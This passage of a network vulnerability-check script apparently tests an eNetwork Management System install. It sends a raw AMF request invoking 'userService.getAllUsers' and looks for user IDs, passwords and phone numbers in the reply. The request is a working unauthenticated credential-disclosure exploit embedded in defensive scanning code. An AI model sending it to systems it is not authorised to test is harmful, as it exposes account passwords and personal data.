...
sndReq = http_get( item: NASLString( "/enetworkmanagementsystem-fds/eNetwor", "kManagementSystem/index.jsp" ), port: port );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
if(ContainsString( rcvRes, "Path=/enetworkmanagementsystem-fds" )){
	postdata = raw_string( 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x17, 0x75, 0x73, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2e, 0x67, 0x65, 0x74, 0x41, 0x6c, 0x6c, 0x55, 0x73, 0x65, 0x72, 0x73, 0x00, 0x02, 0x2f, 0x31, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00 );
	req = NASLString( "POST /enetworkmanagementsystem-fds/messagebroker/amf HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-amf\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	rcvRes = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( rcvRes, "user_id" ) && ContainsString( rcvRes, "user_pass" ) && ContainsString( rcvRes, "user_phone" ) && ContainsString( rcvRes, "enetworkmanagementsystem" )){
